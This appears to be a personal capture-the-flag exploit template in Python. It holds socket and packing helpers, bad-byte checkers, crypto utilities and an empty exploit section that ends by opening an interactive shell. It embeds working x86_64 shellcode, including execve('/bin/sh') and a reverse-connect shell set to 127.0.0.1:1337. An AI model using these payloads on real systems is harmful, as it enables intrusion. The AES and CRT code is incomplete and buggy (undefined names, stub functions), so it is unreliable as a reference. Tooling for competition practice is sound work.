#!/usr/bin/python3
#-*-coding:utf-8-*-

import socket, telnetlib, struct, hexdump, subprocess, sys, logging, time

logging.basicConfig(level=logging.DEBUG, format="%(message)s")
cs, ce = '\x1b[93;41m', '\x1b[0m' # white

def dbg(ss):
  fmt = f"{ss}:"
  try:
    val = eval(ss.encode())
    if type(val) is int:
      fmt += f" {hex(val)}"
    elif type(val) is str or type(val) is bytes:
      fmt += f" {val}"
  except NameError:
    fmt = fmt.rstrip(":")
  logging.debug(cs + fmt + ce)

def inf(ss):
  logging.info("[*] %s"%ss)

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rwb', buffering=None)

def read_until(f, delim=b'\n',textwrap=False):
  if type(delim) is str: delim = delim.encode()
  dat = b''
  while not dat.endswith(delim): dat += f.read(1)
  return dat if not textwrap else dat.decode()

def readline_after(f, skip_until, delim=b'\n'):
  _ = read_until(f, skip_until)
  if type(delim) is str: delim = delim.encode()
  return read_until(f, delim).strip(delim)

def sendline(f, line):
  if type(line) is str: line = (line + '\n').encode()
  f.write(line) # no tailing LF in bytes
  f.flush()

def sendline_after(f, waitfor, line):
  read_until(f, waitfor)
  sendline(f, line)

def skips(f, nr):
  for i in range(nr): read_until(f) 

###################### pwn ########################   
"""
packing :
  pX or px: pack
  uX or ux: unpack
    X : little endian
    x : big endian
"""
def pQ(a): return struct.pack('<Q', a&0xffffffffffffffff)
def __pQ(a):
  ## import structができないとき.
  a = a&0xffffffffffffffff
  ret = [(a >> i*8)&0xff for i in range(8)]
  return bytes(ret)
  
def pq(a): return struct.pack('<q', a&0xffffffffffffffff)
def __pq(a):
  ## import structができないとき.
  a = a&0xffffffffffffffff
  ret = [(a >> i*8)&0xff for i in range(8)]
  return bytes(ret[-1:-9:-1])

def pI(a): return struct.pack('<I', a&0xffffffff)
def p(a):  return pI(a) # alias for pI
def pi(a): return struct.pack('<i', a&0xffffffff)
def pH(a): return struct.pack('<H', a&0xffff)
def ph(a): return struct.pack('<h', a&0xffff)
def pB(a): return struct.pack('B' , a&0xff)
def uQ(a): return struct.unpack('<Q', a.ljust(8, b'\x00'))[0]
def uq(a): return struct.unpack('<q', a)[0]
def uI(a): return struct.unpack('<I', a.ljust(4, b'\x00'))[0]
def u(a):  return uI(a) # alias for uI
def ui(a): return struct.unpack('<i', a)[0]
def uH(a): return struct.unpack('<H', a.ljust(2, b'\x00'))[0]
def uh(a): return struct.unpack('<h', a)[0]
def uB(a): return struct.unpack('B' , a)[0]

def double_to_Q(f): return struct.unpack('<Q', struct.pack('<d', f))[0]

# big endian
def PQ(a): return struct.pack('>Q', a&0xffffffffffffffff)
def Pq(a): return struct.pack('>q', a&0xffffffffffffffff)
def PI(a): return struct.pack('>I', a&0xffffffff)
def P(a):  return PI(a) # alias for PI 
def Pi(a): return struct.pack('>i', a&0xffffffff)
def PH(a): return struct.pack('>H', a&0xffff)
def Ph(a): return struct.pack('>h', a&0xffff)
def PB(a): return struct.pack('B' , a&0xff)
def UQ(a): return struct.unpack('>Q', a)[0]
def Uq(a): return struct.unpack('>q', a)[0]
def UI(a): return struct.unpack('>I', a)[0]
def U(a):  return UI(a) # alias for UI
def Ui(a): return struct.unpack('>i', a)[0]
def UH(a): return struct.unpack('>H', a)[0]
def Uh(a): return struct.unpack('>h', a)[0]
def UB(a): return struct.unpack('B' , a)[0]

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
    

### shellcoding utils ###
## Linux x86_32
nop = 0x90
infloop = b'\xfe\xeb' # jmp $
# Linux x86_64
execve_sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # http://shell-storm.org/shellcode/files/shellcode-806.php

PORT = 1337
IPADDR = socket.inet_aton("127.0.0.1")
## reverse shell (http://shell-storm.org/shellcode/files/shellcode-857.php)
rev_connect_shell = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + \
                    b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + \
                    b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" + \
                    b"\x02"+pH(PORT)+ b"\xc7\x44\x24\x04"+IPADDR+b"\x48\x89\xe6\x6a"  + \
                    b"\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e" + \
                    b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e" + \
                    b"\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57" + \
                    b"\x54\x5f\x6a\x3b\x58\x0f\x05"

sc = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' #x86_64 execveat("/bin//sh") 29 bytes shellcode
sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'         #x86_64 execute /bin/sh - 27 bytes

def scanf_chk(sc):
  assert(type(sc) is bytes)
  assert(not b'\x20' in sc)
  assert(not b'\x0d' in sc)
  assert(not b'\x09' in sc)
  assert(not b'\x0a' in sc)
  assert(not b'\x0b' in sc)
  assert(not b'\x0c' in sc)
  

def fgets_chk(sc):
  assert(type(sc) is bytes)
  assert(not b'\x20' in sc)
  assert(not b'\x0a' in sc)
  assert(not b'\x0b' in sc)
  assert(not b'\x0c' in sc)
  
def dump_sc(payload, scf='sc.dat'):
  scfile = '/tmp/'+scf
  with open(scfile,'wb') as f:
      f.write(payload)
        
def mkasm(code):
  open('/tmp/asm.s','w').write(code)
  cmd =  '   nasm -fbin /tmp/asm.s -l/tmp/asm.lst -o /tmp/asm.bin'
  cmd += ' && rm -f /tmp/asm.s /tmp/asm.lst'
  p = subprocess.run([cmd], shell=True)
  if p.returncode != 0: logging.error(f"Aborted!: assemble error {p.returncode}, {p.stderr}")
  buf = open('/tmp/asm.bin','rb').read()
  return buf
        
  

############## Crypto ###############
import math

def gcd(a,b):
  return math.gcd(a,b)

def xgcd(a, b):
  """return (m, x, y) s.t. a*x + b*y = g = gcd(a,b) """
  x0, x1, y0, y1 = 0, 1, 1, 0
  while not a == 0:
      (q, a), b = divmod(b, a), a
      y0, y1 = y1, y0 - q * y1
      x0, x1 = x1, x0 - q * x1
  return b, x0, y0

def inverse(a, p):
  """ return b s.t a*b = 1 (mod p) """
  g, x, y = xgcd(a, p)
  if g != 1:
    raise Exception('gcd(a,p) != 1')        
  return x%p


def crt(xx, mm):
  """
  args:
    xx: [x1, x2, ,,,, xn]
    mm: [m1, m2, ,,,, mn]
    
  returns:
    x such that
      x = x1 mod m1
      x = x2 mod m2
      x = x3 mod m3
        :
      x = xn mod mn
  """
  assert(len(xx) == len(mm))
  for i, mi in enumerate(mm):
    for j,mj in enumerate(mm):
      if gcd(mi, mj) != 1 and i != j:
        raise ValueError("[!] moduli should be pair wise coprime")
  M = reduce(mul, mm)
  bb = [M // m for m in mm]
    
  assert(len(bb) == len(mm))
  try:
    bb_inv = [inverse(b, m) for b, m in zip(bb, mm)]
  except:
    print("[!] Error: Encounted error while calculating bb_inv") 
    return -1
    
  X = sum([x * b * b_inv for x,b,b_inv in zip(xx, bb, bb_inv)])
  return X % M

rotword = lambda word:word[1:] + word[:1]#left shift
inv_rotword = lambda word:word[-1:] + word[:-1]#right shift
xtime = lambda x:x << 1 if x < 0x80 else ((x << 1) & 0xff) ^ 0x1b

def mul_over2_8(x,y):
  r = 0
  s = x
  for i in reversed(bin(y)[2:]):
    if i == "1":
      r = r ^ s
    s = xtime(s)
        
  return r

RconFull = (0x01,0x02,0x04,0x08,0x10,0x20,0x40,
            0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d)

RconFullTable = ((0x01,0x00,0x00,0x00),(0x02,0x00,0x00,0x00),(0x04,0x00,0x00,0x00),(0x08,0x00,0x00,0x00),
                 (0x10,0x00,0x00,0x00),(0x20,0x00,0x00,0x00),(0x40,0x00,0x00,0x00),(0x80,0x00,0x00,0x00),
                 (0x1b,0x00,0x00,0x00),(0x36,0x00,0x00,0x00),(0x6c,0x00,0x00,0x00),(0xd8,0x00,0x00,0x00),
                 (0xab,0x00,0x00,0x00),(0x4d,0x00,0x00,0x00))

Rcon = [0x01,0x00,0x00,0x00]

Sbox = (
    #0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
)

InvSbox = (
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d 
)

Table4mixcolumns = (
    (0x02,0x03,0x01,0x01),
    (0x01,0x02,0x03,0x01),
    (0x01,0x01,0x02,0x03),
    (0x03,0x01,0x01,0x02)
)

Table4invMixColumns = (
    (0x0e,0x0b,0x0d,0x09),
    (0x09,0x0e,0x0b,0x0d),
    (0x0d,0x09,0x0e,0x0b),
    (0x0b,0x0d,0x09,0x0e)
)


def generateRoundKey(key,rounds):
    keylist = [key]
    newkey = key
    for i in range(rounds):
        newkey = __keyexpansion(newkey)
        keylist.append(newkey)
    return keylist

def keyreverse(key,current_r):
    w3 = [w2 ^ w3 for w2,w3 in zip(key[8:12],key[12:16])]
    w2 = [w1 ^ w2 for w1,w2 in zip(key[4:8],key[8:12])]
    w1 = [w0 ^ w1 for w0,w1 in zip(key[0:4],key[4:8])]
    w0 = [k ^ rc ^ a for k,rc,a in zip(key[0:4],RconFullTable[current_r],rotword(__subbytes(w3)))]
    return w0 + w1 + w2 + w3

def keyexpansion(key,current_r):
    temp = key[12:16]
    temp = [rt ^ rc for rt,rc in zip(subbytes(rotword(temp)),RconFullTable[current_r])]
    w0 = [t ^ k for t,k in zip(temp,key[0:4])]
    w1 = [w ^ k for w,k in zip(w0, key[4:8])]
    w2 = [w ^ k for w,k in zip(w1, key[8:12])]
    w3 = [w ^ k for w,k in zip(w2, key[12:16])]
    return w0 + w1 + w2 + w3

def addroundkey(state,roundkey):
    return [s ^ r for s,r in zip(state,roundkey)]


def shiftrows(state):
    newstate = [0] * 16

    newstate[0], newstate[ 4], newstate[ 8], newstate[12] = state[ 0], state[ 4], state[ 8], state[12]
    newstate[1], newstate[ 5], newstate[ 9], newstate[13] = state[ 5], state[ 9], state[13], state[ 1]
    newstate[2], newstate[ 6], newstate[10], newstate[14] = state[10], state[14], state[ 2], state[ 6]
    newstate[3], newstate[ 7], newstate[11], newstate[15] = state[15], state[ 3], state[ 7], state[11]
    
    return newstate

def inv_shiftrows(state):
    newstate = [0] * 16
    
    newstate[0], newstate[ 4], newstate[ 8], newstate[12] = state[ 0], state[ 4], state[ 8], state[12]
    newstate[1], newstate[ 5], newstate[ 9], newstate[13] = state[13], state[ 1], state[ 5], state[ 9]
    newstate[2], newstate[ 6], newstate[10], newstate[14] = state[10], state[14], state[ 2], state[ 6]
    newstate[3], newstate[ 7], newstate[11], newstate[15] = state[ 7], state[11], state[15], state[ 3]
    
    return newstate

def mixcolumns(state):
    newstate = [0 for _ in range(16)]
    for w in range(4):
        tmp = state[w * 4:w * 4 + 4]
        newstate[w*4 + 0] = xtime(tmp[0]) ^ ( xtime(tmp[1]) ^ tmp[1] ) ^ tmp[2] ^ tmp[3]
        newstate[w*4 + 1] = tmp[0] ^ xtime(tmp[1]) ^ (xtime(tmp[2]) ^ tmp[2]) ^ tmp[3]
        newstate[w*4 + 2] = tmp[0] ^ tmp[1] ^ xtime(tmp[2]) ^ (xtime(tmp[3]) ^ tmp[3])
        newstate[w*4 + 3] = xtime(tmp[0]) ^ tmp[0] ^ tmp[1] ^ tmp[2] ^ xtime(tmp[3])
    return newstate



def inv_mixcolumns(state):
    newstate = [0 for _ in range(16)]
    for w in range(4):
        tmp = state[w*4:w * 4 + 4]
        newstate[w*4 + 0] = mul_over2_8(tmp[0],0x0e) ^ \
                            mul_over2_8(tmp[1],0x0b) ^ \
                            mul_over2_8(tmp[2],0x0d) ^ \
                            mul_over2_8(tmp[3],0x09)
        
        newstate[w*4 + 1] = mul_over2_8(tmp[0],0x09) ^ \
                            mul_over2_8(tmp[1],0x0e) ^ \
                            mul_over2_8(tmp[2],0x0b) ^ \
                            mul_over2_8(tmp[3],0x0d)
        
        newstate[w*4 + 2] = mul_over2_8(tmp[0],0x0d) ^ \
                            mul_over2_8(tmp[1],0x09) ^ \
                            mul_over2_8(tmp[2],0x0e) ^ \
                            mul_over2_8(tmp[3],0x0b)
        
        newstate[w*4 + 3] = mul_over2_8(tmp[0],0x0b) ^ \
                            mul_over2_8(tmp[1],0x0d) ^ \
                            mul_over2_8(tmp[2],0x09) ^ \
                            mul_over2_8(tmp[3],0x0e)
        
    return newstate

    
def subbytes(state):
    return [Sbox[s] for s in state]

def inv_subbytes(state):
    return [InvSbox[s] for s in state]

def round_enc(state,roundkey):
    return addroundkey(mixcolumns(shiftrows(subbytes(state))),roundkey)


def round_enc_final(state,roundkey):
    return addroundkey(shiftrows(subbytes(state)),roundkey)


def encrypt128(plain,key):
    state = plain
    roundkey = key
    state = addroundkey(state,roundkey)
    for i in range(9):
        roundkey = keyexpansion(roundkey,i)
        state = round_enc(state,roundkey)
    roundkey = keyexpansion(roundkey,9)
    state = round_enc_final(state,roundkey)
    return state
        
def round_dec(state,roundkey):
    return inv_subbytes(inv_shiftrows(inv_mixcolumns(addroundkey(state,roundkey))))

def round_dec_final(state,roundkey):
    pass

class AES(object):
    def __init__(self,key):
        self.setKey(key)
        
    def setKey(self,key):
        _k = None
        if type(key) is list:
            _k = key
        elif type(inputdata) is str:
            _k = list(key.encode())
        elif type(key) is bytes:
            _k = list(inputdata)
        else:
            raise TypeError
        self.checkKey(_k)
    
    def checkKey(self,_key):
        keylen = len(_key)
        if keylen in (16,24,32):
            self.key = _key
        else:
            raise ValueError
            
    def setText(self,inputdata):
        if type(inputdata) is list:
            self.state = inputdata
        elif type(inputdata) is str:
            inputdata = inputdata.encode()
            self.state = inputdata.split()
        elif type(inputdata) is bytes:
            self.state = list(inputdata)
        else:
            raise TypeError

        
    def encrypt(self,plain):
        self.setText(plain)
        return encrypt128(self.state,self.key)
    
    def decrypt(self,cipher):
        self.setText(cipher)
        return __decryption(self.state,self.key,self.roundnum)
        
    
    
class AES_dev(object):
    @classmethod
    def AddRoundKey(cls,state,roundkey):
        return addroundkey(state,roundkey)
    @classmethod
    def getSboxValue(cls,byte):
        return Sbox[byte]
    
    @classmethod
    def SubBytes(cls,state):
        return subbytes(state)

    @classmethod
    def InvSubBytes(cls,state):
       return inv_subbytes(state)

    @classmethod
    def MixColumns(cls,state):
        return mixcolumns(state)

    @classmethod
    def ShiftRows(cls,state):
        return shiftrows(state)

    @classmethod
    def InvSubBytes(cls,state):
        return invsubbytes(state)

    @classmethod
    def KeyExpansion(cls,key,roundidx):
        return keyexpansion(key,roundidx)

    @classmethod
    def cont_KeyExpansion(cls,roundkey,roundidx):
        pass
        
    @classmethod
    def getRoundKey(cls,key,roundnum):
        roundkey = key[:]
        for i in range(roundnum):
            roundkey = keyexpansion(roundkey,i)
        return roundkey
    
    @classmethod
    def getMasterKeyFromRK(cls, roundkey,roundidx):
        pass

    @classmethod
    def roundEnc(cls,state,roundkey):
        return mixcolumns(subbytes(shiftrows(addroundkey(state,roundkey))))
     
#############################################################################################
banner = 'test'
HOST, PORT = '127.0.0.1', 1337 
"""
    main.sh
    # $socat TCP-LISTEN:1337,reuseaddr,fork exec:./main.sh
    gdbserver localhost:1234 ./<chall>
"""
if len(sys.argv) == 2 and sys.argv[1] == 'r':
  banner = 'remote'
  HOST, PORT = '<remote-host>', 1337

logging.info(banner)
# start = time.time()
s, f = sock(HOST, PORT)
### exploit from here ###


### end of exploit ###
shell(s)
# logging.info("Elapsed time %f (sec)"%(time.time() - start))
